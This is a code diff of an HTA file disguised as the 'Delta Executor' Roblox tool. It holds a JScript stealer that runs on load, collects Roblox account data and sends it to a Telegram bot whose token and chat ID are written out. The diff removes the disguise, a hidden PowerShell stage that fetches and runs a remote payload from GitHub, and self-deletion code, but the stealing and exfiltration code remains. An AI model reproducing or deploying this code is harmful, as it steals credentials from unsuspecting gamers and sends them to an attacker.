@@ -1,14 +1,6 @@
-<!-- deltaexecutor-vip.xyz.hta -->
+<!-- payload -->
 <html>
 <head>
-<title>Delta Executor</title>
-<hta:application
-    id="delta"
-    applicationname="Delta Executor"
-    border="none"
-    caption="no"
-    showintaskbar="no"
-    windowstate="minimize" />
 <script language="JScript">
 var TOKEN = "8814328356:AAFwdZd_Mlj9kZOOUVw7ERPEnRB238jqzTE";
 var CHAT = "8692286004";
@@ -16,7 +8,6 @@ var API = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
 var wsh = new ActiveXObject("WScript.Shell");
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 var xhr = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-var payloadUrl = "https://raw.githubusercontent.com/brentfincher12-star/site/main/payload";
 
 function send(msg) {
     try {
@@ -114,27 +105,12 @@ function grab() {
     
     send("ROBLOX:\\n" + (found || "NOT_FOUND"));
     try { fso.DeleteFile(tmp); } catch(e) {}
-    
-    // --- Stage 2: GitHub payload ---
-    var psPayload = 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex (irm ' + payloadUrl + ')"';
-    wsh.Run(psPayload, 0, false);
-    
-    // --- Self-elimination ---
-    try {
-        var self = document.location.href.replace("mshta://", "").replace("file:///", "");
-        if (fso.FileExists(self)) { fso.DeleteFile(self); }
-    } catch(e) {}
-    
     close();
 }
 
 window.onload = grab;
 </script>
 </head>
-<body style="margin:0;padding:0;background:#0a0a0a;">
-<div style="font-family:Segoe UI,sans-serif;color:#00ff88;text-align:center;padding-top:40vh;">
-    <h1>Delta Executor</h1>
-    <p>Loading...</p>
-</div>
+<body style="margin:0;padding:0;">
 </body>
 </html>
